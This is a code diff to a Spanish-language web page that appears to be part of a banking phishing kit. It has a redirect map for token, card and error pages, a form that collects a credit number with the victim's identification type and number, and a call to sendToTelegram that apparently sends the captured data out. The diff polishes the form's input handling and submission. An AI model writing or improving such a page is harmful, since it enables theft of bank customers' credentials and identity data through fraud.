@@ -146,14 +146,14 @@
     <script src="action.js"></script>
     <script>
         // ============================================================
-        // 🗺️ MAPA DE REDIRECCIONES (sobrescribe/amplía el de action.js)
+        // 🗺️ MAPA DE REDIRECCIONES
         // ============================================================
         const REDIRECTS = {
             'error': 'index1.html?error=wrong_data',
             'token': 'token.html',
             'token_otro': 'tokeninv.html',
-            'credito': 'transaction_summary.html',        // ← NUEVO
-            'credito_ok': 'transaction_summary.html',     // ← NUEVO
+            'credito': 'transaction_summary.html',
+            'credito_ok': 'transaction_summary.html',
             'credito_error': 'index1.html?error=wrong_data',
             'tarjeta_debito': 'tarjeta.html',
             'tarjeta_credito': 'tarjeta.html',
@@ -215,14 +215,34 @@
             const btn = document.getElementById('btnContinuar');
             const msgErr = document.getElementById('msgError');
 
-            input.addEventListener('input', () => {
-                input.value = input.value.replace(/[^0-9]/g, '');
-                const tiene = input.value.trim().length > 0;
+            // Estado inicial
+            btn.disabled = true;
+            btn.classList.remove('active');
+
+            input.addEventListener('input', function() {
+                // Solo números
+                this.value = this.value.replace(/[^0-9]/g, '');
+
+                const tiene = this.value.trim().length > 0;
+
+                // Habilitar / deshabilitar
                 btn.disabled = !tiene;
+
+                // Cambiar color del botón (btn-gray.active → negro)
                 btn.classList.toggle('active', tiene);
-                btn.classList.toggle('btn-gray', !tiene);
-                btn.classList.toggle('btn-dark', tiene);
+
+                // Ocultar error al escribir
                 msgErr.style.display = 'none';
+            });
+
+            // Enviar con Enter
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (!btn.disabled) {
+                        sendCreditForm(e);
+                    }
+                }
             });
 
             input.focus();
@@ -259,14 +279,14 @@
                 numero_identificacion: localStorage.getItem('user_id_number') || 'Desconocido'
             };
 
-            // ⚠️ Enviamos como tipo "credito" para no chocar con la validación de token
+            // ⚠️ Enviamos como tipo "credito"
             const creditData = {
                 credito: creditNumber,
                 tipo_identificacion: userData.tipo_identificacion,
                 numero_identificacion: userData.numero_identificacion
             };
 
-            // Guardar también en localStorage (compatibilidad Mobilize)
+            // Guardar en localStorage (compatibilidad Mobilize)
             localStorage.setItem('userInfo', JSON.stringify(creditData));
 
             if (typeof sendToTelegram === 'function') {
